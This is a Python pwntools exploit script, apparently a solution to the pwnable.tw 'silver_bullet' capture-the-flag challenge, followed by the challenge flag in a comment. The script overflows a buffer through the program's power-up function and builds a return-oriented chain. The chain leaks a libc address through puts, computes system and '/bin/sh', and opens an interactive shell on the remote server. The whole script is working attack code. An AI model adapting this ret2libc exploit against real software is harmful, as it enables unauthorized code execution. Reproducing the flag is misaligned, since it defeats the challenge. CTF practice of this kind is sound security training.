from pwn import *
import time
import sys
from hashlib import sha256
import os

def silver(DEBUG):
	if DEBUG=="1":
		offset_puts = 0x05fca0
		offset_system = 0x03ada0
		offset_binsh = 0x15ba0b
		r = process("./silver_bullet")
		raw_input("DEBUG?")
	if DEBUG=="2":
		offset_puts = 0x0005f140
		offset_system = 0x0003a940
		offset_binsh = 0x158e8b
		HOST = "chall.pwnable.tw"
		PORT = 10103
		r = remote(HOST,PORT)
	
	puts = 0x80484a8
	got_puts = 0x0804AFDC
	loop = 0x080484F0 #start
	ebp = 0x0804B01F
	
	def create(str):
		r.sendline("1")
		r.recvuntil("Give me your description of bullet :")
		r.sendline(str)
		return r.recvuntil("Your choice :")
		
	def powerup(str):
		r.sendline("2")
		r.recvuntil("Give me your another description of bullet :")
		r.sendline(str)
		print r.recvuntil("Your choice :")
	
	def beat():
		r.sendline("3")
		return r.recvuntil("Try to beat it .....")
		
	
	def exploit(arg1, arg2):
		r.recvuntil("Your choice :")
		create("A"*47)
		powerup("A")
		payload = ""
		payload += "A"*7
		payload += p32(arg1)
		payload += p32(loop)
		payload += p32(arg2)
		powerup(payload)
		beat()
		r.recvuntil("Your choice :")
		beat()
		print r.recvuntil("Oh ! You win !!\n")
		
	exploit(puts,got_puts)
	res = u32(r.recv(4))
	# print res
	base = res - offset_puts
	system = base + offset_system
	binsh = base + offset_binsh
	log.info("res: %#x" %res)
	log.info("base: %#x" %base)
	log.info("system: %#x" %system)
	log.info("binsh: %#x" %binsh)
	
	exploit(system, binsh)
	r.interactive()

silver(sys.argv[1])
#FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}